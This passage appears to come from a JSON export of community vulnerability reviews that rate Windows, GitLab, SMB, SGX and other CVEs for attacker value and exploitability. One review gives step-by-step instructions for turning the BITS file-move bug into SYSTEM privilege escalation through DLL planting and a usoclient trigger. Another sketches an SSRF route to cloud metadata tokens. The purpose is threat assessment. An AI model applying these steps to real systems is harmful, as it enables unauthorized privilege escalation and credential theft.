        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "8762f1af-5531-476e-8583-863ce6bf6126",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "27db2819-5039-4831-815a-798764488b88",
      "created": "2020-06-09T19:11:51.95592Z",
      "revisionDate": "2020-06-09T19:11:51.963761Z",
      "document": "This vuln. appears to allow any authenticated user on a Windows system to modify the configuration settings for OpenSSH, which would allow for configuring it in such a way that could allow for a privilege escalation for an inbound user via SSH. OTOH, if you are already authenticated, you could just login yourself and perform an LPE much the same way as SMBGhost was used for LPE CVE-2020-0796",
      "score": 1,
      "metadata": {
        "tags": [
          "easy_to_develop",
          "post_auth",
          "common_enterprise",
          "high_privilege_access"
        ],
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "65dff02d-b9c1-49fe-95b1-769f33e78341",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "e2b9f961-5f1f-496f-97f1-1cf8968ae023",
      "created": "2020-06-09T19:23:24.927084Z",
      "revisionDate": "2020-06-09T19:53:03.951333Z",
      "document": "It's too early to really parse exactly what Microsoft means by 'an authenticated attacker' since this could mean a read-only guest user or something else entirely. It's probably not all that interesting to get RCE on a target you can already log into unless there's some sort of more restricted access that you want to privesc. I suspect we'll see this one being leveraged more for LPE than RCE once the details are available, though there may also be lower hanging fruit as well.",
      "score": 2,
      "metadata": {
        "tags": [
          "common_enterprise",
          "post_auth"
        ],
        "attacker-value": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "70ed0f92-818d-4224-a9cc-0f1db4a3e384",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "c9b4bb36-5160-45c7-b6d7-dd13245d233f",
      "created": "2020-06-09T22:49:50.254455Z",
      "revisionDate": "2020-11-17T01:52:46.969211Z",
      "document": "@zeroSteiner pointed us to this exploit chain today: https://twitter.com/CasvCooten/status/1270374273849401346. It uses [CVE-2020-10535](https://attackerkb.com/topics/n2NeGkZ65b/cve-2020-10535) to satisfy the authentication requirement. Note that https://hackerone.com/reports/827052 already [explains](https://hackerone.com/reports/827052#activity-7406468) the path to RCE. ~~We actually already have a [Rails secret deserialization exploit](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/rails_secret_deserialization.rb), so \"weaponizing\" the exploit chain is possible.~~ @adfoster-r7 has pointed out that GitLab requires a signed cookie, so this module will not work.",
      "score": 3,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        }
      ]
    },
    {
      "id": "a2f6691e-ca41-4268-ae42-f1461b3ace86",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "fff81f98-d7c3-4efe-8322-ab2a9580b2f1",
      "created": "2020-06-09T22:52:19.828544Z",
      "revisionDate": "2020-06-09T22:52:19.83277Z",
      "document": "Some more details here: https://about.gitlab.com/releases/2020/03/11/critical-security-release-gitlab-12-dot-8-dot-6-released/.",
      "score": 1,
      "metadata": {
        "tags": [
          "common_enterprise"
        ],
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        }
      ]
    },
    {
      "id": "60420da4-1a9f-4c48-9015-ae07a0079b09",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "db7d4d6f-62df-4b24-b7a1-c8b584415e20",
      "created": "2020-06-09T23:22:05.587734Z",
      "revisionDate": "2020-06-09T23:23:50.350721Z",
      "document": "A new uPnP protocol bug seems to pop up every year or two, looking back on it folks have known it was a bad idea to expose these to the Internet forever, and that uPnP is itself not a great idea from a security PoV.  Will likely exist for a long time given the number of devices in existence, so expect it to be used mostly for DDOS operations like @kevthehermit suggests.",
      "score": 2,
      "metadata": {
        "tags": [
          "difficult_to_patch",
          "easy_to_develop"
        ],
        "attacker-value": 1,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        }
      ]
    },
    {
      "id": "e89c6a05-624d-447d-9c56-37536d359c8a",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "c2c941cd-e96f-449d-acf8-2c06ebd69a39",
      "created": "2020-06-09T23:26:49.431943Z",
      "revisionDate": "2020-06-09T23:26:49.436184Z",
      "document": "This is a primitive that could be useful to complete another attack chain in conjunction with other vulnerabilities. Something to keep in your back pocket when you're trying to exploit other corruption bugs perhaps.",
      "score": 1,
      "metadata": {
        "tags": [
          "common_enterprise"
        ],
        "attacker-value": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        }
      ]
    },
    {
      "id": "5f35e402-b92a-496b-bed3-9385516ec4ed",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "ed7a6ea3-f225-4031-8f6d-1d6bd236f267",
      "created": "2020-06-09T23:34:49.339599Z",
      "revisionDate": "2020-06-09T23:34:49.344208Z",
      "document": "This is more embarrassing for Microsoft than something to worry about from an attacker. I'm curious though what data folks _didn't_ expect Microsoft to get from something called 'Windows Diagnostics and Feedback'. I always just assumed it was minidumps in the first place, so plenty was already disclosed. Tricky line to draw in the sand.",
      "score": 1,
      "metadata": {
        "tags": [
          "common_enterprise",
          "no_useful_data"
        ],
        "attacker-value": 1,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "beffd0e8-89eb-4be6-9e1f-60793bc53a46",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "0ce94594-30df-4c05-8440-42c4103287ce",
      "created": "2020-06-09T23:43:07.732512Z",
      "revisionDate": "2020-06-10T14:51:41.109202Z",
      "document": "Sure it's an authenticated vuln, but being able to just switch user accounts sounds like a fun way to cause havoc, especially for long-term persistence type scenarios. Though I guess the average pentest is all about just getting the actual credentials in the first place, but this might be useful for real APT scenarios, especially since it affects  the last three major releases.\r\n\r\nDon't know much details of the actual 'specially crafted request', so it's hard to say exactly how exploitable this would be, and you do need creds in the first place. Probably nifty for insider jobs.",
      "score": 2,
      "metadata": {
        "tags": [
          "easy_to_develop",
          "common_enterprise",
          "default_configuration",
          "high_privilege_access"
        ],
        "attacker-value": 3,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "7bc58aab-7320-45da-aabd-e175cff200aa",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "ed05ca72-27c8-4c22-bff9-2ae3451c549c",
      "created": "2020-06-09T23:49:01.028193Z",
      "revisionDate": "2020-06-10T17:56:08.280436Z",
      "document": "Edit: After writing this @adfoster-r7 pointed out that Zecops has a writeup on exactly how to chain this with SMBGhost. How apropos! https://blog.zecops.com/vulnerabilities/smbleedingghost-writeup-chaining-smbleed-cve-2020-1206-with-smbghost/\r\n\r\nNote that if you were already patched against CVE-2020-0796, the current PoCs aren't going to be impactful to you, so the urgency is lower than if you're a couple of months out of date. If you're patching already, no need to panic.\r\n\r\nWhenever we see SMB memory corruption leaks, the cry is always 'oh, if only we had an information leak, we could make this so much more reliable'. Well, assuming someone figures out the details, this could be the information leak folks are looking for to make SMBGhost and other vulnerabilities more reliable to exploit. Not a big deal by itself, but I imagine folks are already trying to figure out how to use this to an advantage. It might not take long given the existence of public SMBGhost PoCs already.",
      "score": 3,
      "metadata": {
        "tags": [
          "common_enterprise"
        ],
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        }
      ]
    },
    {
      "id": "68b63322-5d19-4b7a-9445-d1814558a076",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "e2b9f961-5f1f-496f-97f1-1cf8968ae023",
      "created": "2020-06-10T00:14:48.018147Z",
      "revisionDate": "2020-07-16T18:05:05.163073Z",
      "document": "To add to @busterb's assessment, another thing to consider is that SMBv1, which this vulnerability relies on, is disabled by default on Windows 10 (Build 1803) according to https://www.petenetlive.com/KB/Article/0001461. This is further confirmed on Microsoft's official website at https://docs.microsoft.com/en-us/windows-server/storage/file-server/troubleshoot/smbv1-not-installed-by-default-in-windows where they state that SMBv1 is not installed by default on Windows 10 version 1709 and later and Windows Server version 1709 and later.\r\n\r\nConsidering the push from Microsoft to force Windows 10 users to automatically upgrade, and the fact that according to https://gs.statcounter.com/os-version-market-share/windows/desktop/worldwide, 72.96% of Windows users are running Windows 10, the chances are that unless your in an environment where you need to support older software, SMBv1 is most likely going to be disabled.\r\n\r\nExploitability will most likely be difficult given the past history of SMB vulnerabilities, but may be easier on older versions of Windows such as Windows 7 that have not introduced the modern mitigations that Windows 10 has, particularly in the area of heap randomization.",
      "score": 3,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "obscure_configuration",
          "post_auth",
          "common_enterprise"
        ],
        "attacker-value": 3,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "e61cfec0-d766-4e7e-89f7-5aad2460afb8",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "af37cd6e-8730-4aef-8679-0413b491a107",
      "created": "2020-06-10T02:20:26.47627Z",
      "revisionDate": "2020-06-10T14:52:12.030242Z",
      "document": "Wrote the Metasploit module for this vulnerability which is currently sitting as a PR at https://github.com/rapid7/metasploit-framework/pull/13554. Let me start with an overview of this vulnerability and then explain why I believe this vulnerability is more valuable than it may initially appear to be.\r\n\r\nFirst off, as mentioned in other reviews of this bug, you can find the original writeup at https://itm4n.github.io/cve-2020-0787-windows-bits-eop/ and the PoC at https://github.com/itm4n/BitsArbitraryFileMove. As described in the blog, the BITS service exposes the `Legacy Control Class` over COM. An attacker can use this to obtain a pointer to the `IBackgroundCopyGroup` interface, which contains two undocumented methods, `QueryJobInterface()` and `SetNotificationPointer()`. By calling the `QueryJobInterface()` method of the `IBackgroundCopyGroup` method, the attacker will get a handle to the new `IBackgroundCopyJob` interface.\r\n\r\nThe problem here is that the handle to the `IBackgroundCopyJob` group is done without proper impersonation. Normally this would not be an issue since the other methods implement impersonation properly. However there is a catch. When adding a new job using the `IBackgroundCopyJob` interface that was returned via the method described earlier, the temporary file that BITS creates when creating a new job will be renamed via a call to `MoveFileEx()` with the permissions of the `IBackgroundCopyJob` interface. Well since BITS runs as SYSTEM and the `IBackgroundCopyJob` interface didn't implement impersonation, guess what? Its going to copy the file as the SYSTEM user.\r\n\r\nExploitation of this vulnerability is not the most difficult in the world but it basically relies on the following process (described in https://itm4n.github.io/cve-2020-0787-windows-bits-eop/ way better than I can explain it here, but heck I'll give it a shot):\r\n\r\n1. Set up a temporary directory that will be our staging area and create two folders: Bait and MountPoint inside of it.\r\n2. Upload the payload DLL within this temporary directory.\r\n3. Create a symbolic link between MountPoint and Bait.\r\n4. Create a new job using the `IBackgroundCopyJob` interface, whose handle is obtained by calling the `QueryJobInterface()` method of the `IBackgroundCopyGroup` interface,\r\n5. Since the BITS job will be created in a suspended state, locate the temporary BITS job file, and set a file oplock on it so that our function will be called whenever someone tries to move the file.\r\n6. Resume the BITS job\r\n7. Our oplock gets hit. Delete the previous symbolic link, and create a symbolic link between the MountPoint directory and `\\RPC Control\\`. Create two more symbolic links to link the temporary BITS file within the MountPoint directory to the DLL we want to copy, and the sample `test.txt` file we were going to the file to so that it instead points to the protected location we would like the file to be copied to.\r\n8. Release the oplock, and profit!\r\n\r\nAgain its probably better you look at the `How to Exploit this Vulnerability?` section of https://itm4n.github.io/cve-2020-0787-windows-bits-eop/ for a better explanation of this, he words it much better than I do.\r\n\r\nWith this aside though the next important thing to note is that BITS was introduced with Windows 7, which is reflected in the affected systems listed at https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0787. Looking over this list we can see that every single version of Windows, be it Server or Workstation, is affected by this vulnerability, regardless of architecture.\r\n\r\nIn fact further examination of this bug revealed that with the PoC provided, one can very reliably obtain SYSTEM level file copies on nearly any affected machine with no interruption to its service at all. The only downside though is that SYSTEM level file copies alone are not enough to get LPE. To do this an attacker needs to combine this vulnerability with a DLL hijacking vulnerability or some other vulnerability where the placement of an arbitrary file into a protected location would grant the attacker additional privileges.\r\n\r\nIn the case of the PoC and the Metasploit module, this is achieved by taking advantage of a bug in the Windows Update Session Orchestrator service, which is well documented at https://itm4n.github.io/usodllloader-part1/ and https://itm4n.github.io/usodllloader-part2/. In a nutshell, an attacker can gain SYSTEM level code execution if they can create the file `C:\\Windows\\System32\\WindowsCoreDeviceInfo.dll` and then run the undocumented command `\r\nusoclient StartScan` or `usoclient StartInteractiveScan`. Note that since the Update Session Orchestrator service only exists on Windows 10 and later, it is only possible to use this technique on those computers. With this being said though other techniques could be used to gain LPE on other Windows systems, it is just a matter of creativity.\r\n\r\nThis means that in essence, any Windows system that has not applied the March 2020 updates has a pretty universally accessible arbitrary file copy vulnerability **provided that an attacker already has local access to the system**. The only other limitation is the aforementioned DLL hijacking issue; however should an attacker account for this via vulnerabilities such as the NetMan DLL hijacking issue described at https://itm4n.github.io/windows-server-netman-dll-hijacking/, which affects all Windows Server editions from Windows Server 2008 R2 to Windows Server 2019, they could easily adjust this vulnerability to escalate privileges on a wide variety of systems.\r\n\r\nIn summary this is one to look out for and I can see this being weaponized in the future, however attackers will need a little bit of work to get a DLL hijacking bug working for each target they want to compromise (not that hard given that Microsoft doesn't consider DLL hijacking issues a bug and tends not to patch them), and the fact that they need local access (the main limiting factor here).\r\n",
      "score": 6,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "high_privilege_access",
          "post_auth"
        ],
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "357892fd-8cb5-4d6f-ada4-e6f9aebfbe55",
      "editorId": "2ccacbe6-ae15-400a-8cd0-57acc7fb593c",
      "topicId": "72725b13-8444-4a5a-b4e8-71cf57ff5c25",
      "created": "2020-06-10T15:18:54.463646Z",
      "revisionDate": "2020-08-03T18:23:03.061834Z",
      "document": "SSRF should be possible through https://vulnerable.host/avatar/redirect\r\n\r\nThat redirect is tricky since the vulnerable code is splitting on \"/\" and taking the last value. Need it to hit a url with a vulnerable redirect that can redirect to a metadata URL. From there it may be possible to hit the metadata url and grab STS tokens or pivot elsewhere. ",
      "score": 4,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "high_privilege_access",
          "pre_auth"
        ],
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "79d40306-8f8a-479c-8855-8c895b8c7c03",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "1bf8711c-479c-44ae-a936-ec1160f0dc29",
      "created": "2020-06-11T17:05:23.281382Z",
      "revisionDate": "2020-06-11T17:56:22.236542Z",
      "document": "Vuln affects versions 5.0.0 to 5.5.4 and is weaponized in the form of a Metasploit module: https://github.com/rapid7/metasploit-framework/pull/13512\r\nCredit to Charles Fol for discovery and Zenofex for fast analysis and slick weaponization. \r\n\r\nI keep thinking that it's unlikely enterprises use vBulletin and this must be more of a risk to small- and medium-sized businesses, but looking at some of the companies that are said to be vBulletin customers, I suppose that's not necessarily true. [Article on in-the-wild exploitation here.](https://www.helpnetsecurity.com/2019/09/25/cve-2019-16759/)",
      "score": 1,
      "metadata": {
        "tags": [
          "pre_auth",
          "exploited_in_the_wild"
        ],
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "47cad8d6-8c9d-42f5-bd6e-b31e7b95ff5e",
          "name": "Exploited in the wild (DEPRECATED)",
          "type": "deprecated",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild_deprecated"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "313926a8-8693-4e1f-a92a-a3a0302a8823",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "2f0f7d23-7b28-4849-b0fc-3b12ab190d21",
      "created": "2020-06-11T17:58:38.13333Z",
      "revisionDate": "2020-06-12T16:57:00.862303Z",
      "document": "Just an update to my previous assessment (@tekwizz123), but this was in fact exploited in the wild as noted at https://blogs.360.cn/post/RootCause_CVE-2019-0808_EN.html and https://securityaffairs.co/wordpress/82428/hacking/cve-2019-0808-win-flaw.html. ",
      "score": 2,
      "metadata": {
        "tags": [
          "exploited_in_the_wild"
        ]
      },
      "tags": [
        {
          "id": "47cad8d6-8c9d-42f5-bd6e-b31e7b95ff5e",
          "name": "Exploited in the wild (DEPRECATED)",
          "type": "deprecated",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild_deprecated"
        }
      ]
    },
    {
      "id": "d7c74752-5444-4d60-83d9-38edf4bc997b",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "ab2b1aa7-d3df-4751-8be2-454c70bac01d",
      "created": "2020-06-12T21:44:49.281939Z",
      "revisionDate": "2020-06-12T21:44:49.286834Z",
      "document": "A vulnerability exists with the Windows kernel that can be used to bypass the NULL page mitigation feature that prevents users from allocating the memory that exists at the literal address 0. This is required for exploiting the class of memory corruption vulnerabilities known as NULL Page Dereferece or NULL Pointer Derefernce. This vulnerability would not be useful on it's own but rather would make exploitation of another vulnerability practical.\r\n\r\nIn order to leverage this vulnerability, Intel's SGX functionality must be available on the host. From my testing, the required functionality does not appear to be available from within virtual machines, meaning that a vulnerable environment would likely have to run on hardware. The vulnerability exists within the implementation of the `NtCreateEnclave`.\r\n\r\nThe function `NtCreateEnclave` is exposed through ntdll, was added in Windows 10 v1511 and uses the following signature (according to [Process Hacker](https://github.com/processhacker/processhacker/blob/2e8d04137f434460011dad9f0242adb1b3de7292/phnt/include/ntmmapi.h#L1012-L1025)):\r\n\r\n```\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtCreateEnclave(\r\n    _In_ HANDLE ProcessHandle,\r\n    _Inout_ PVOID* BaseAddress,\r\n    _In_ ULONG_PTR ZeroBits,\r\n    _In_ SIZE_T Size,\r\n    _In_ SIZE_T InitialCommitment,\r\n    _In_ ULONG EnclaveType,\r\n    _In_reads_bytes_(EnclaveInformationLength) PVOID EnclaveInformation,\r\n    _In_ ULONG EnclaveInformationLength,\r\n    _Out_opt_ PULONG EnclaveError\r\n    );\r\n```\r\n\r\n`NtCreateEnclave` will return 0xc00000bb (STATUS_NOT_SUPPORTED) if the necessary SGX capabilities are unavailable, making identification relatively easy.\r\n\r\nI flag this as \"No useful access\" because it's most valuable as an exploit primitive, and does not provide any access or information on it's on. \r\n\r\nReferences: https://twitter.com/waleedassar/status/1270550282695585792",
      "score": 1,
      "metadata": {
        "tags": [
          "no_useful_data",
          "common_enterprise",
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 2,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "05c03b02-e289-43cf-af05-dfb94b1ff20e",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "0ef34ee1-74ed-42ff-a543-9543d3950c10",
      "created": "2020-06-15T18:59:12.387135Z",
      "revisionDate": "2020-06-17T09:39:22.760416Z",
      "document": "A buffer overread in a very specific part of the glibc regex engine is something, but nothing really by itself. A read might potentially give an attacker a memory leak, but given the number of vendors who _haven't_ patched I don't really believe the 'network' vector or the high criticality granted from the NVD CVSS. Red Hat's assessment is more in line: https://access.redhat.com/security/cve/cve-2019-9169\r\n\r\nTo fully address this vuln, literally every Linux installation on the planet would have to be patched, which just isn't going to happen.",
      "score": 2,
      "metadata": {
        "tags": [
          "common_enterprise",
          "difficult_to_patch",
          "difficult_to_develop"
        ],
        "attacker-value": 1,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "d9a00745-381c-4df4-9e56-6698d637991d",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "555ef2e1-269f-4133-8d13-b67ea80f8cc3",
      "created": "2020-06-15T20:18:49.440633Z",
      "revisionDate": "2020-06-15T20:19:41.823896Z",
      "document": "This continues to bury SGX as an actual security mechanism users should be interested in. For leaking keys where you have local access, this is useful for Intel CPUs manufactured in the last 5 years. For general purpose exploitation though, this is less likely to be useful, and the overall risk of using this mechanism still leaves many developers who might use this feature suspicious as they ever were.\r\n\r\nThe huge performance degradation of RDRAND also isn't great, though the real problem is for virtual hosting providers where a malicious process or VM can kill overall memory bus performance. https://www.phoronix.com/scan.php?page=news_item&px=RdRand-3-Percent \r\n\r\nThere are some funny secret-squirrel uses here for the mitigation, as it enables a totally different side-channel problem, but nothing you'd likely see more as a novelty: https://twitter.com/Kryptoblog/status/1270601775184334849",
      "score": 1,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "easy_to_develop"
        ],
        "attacker-value": 2,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "d6c6f89f-f33b-4a36-afb6-7fa927e5b812",
      "editorId": "97bf384d-2eca-47f2-b98a-28bc8378baf2",
      "topicId": "493de795-fdc0-4514-a1c2-566d0108fd2e",
      "created": "2020-06-17T15:54:56.500949Z",
      "revisionDate": "2020-09-29T15:53:39.392233Z",
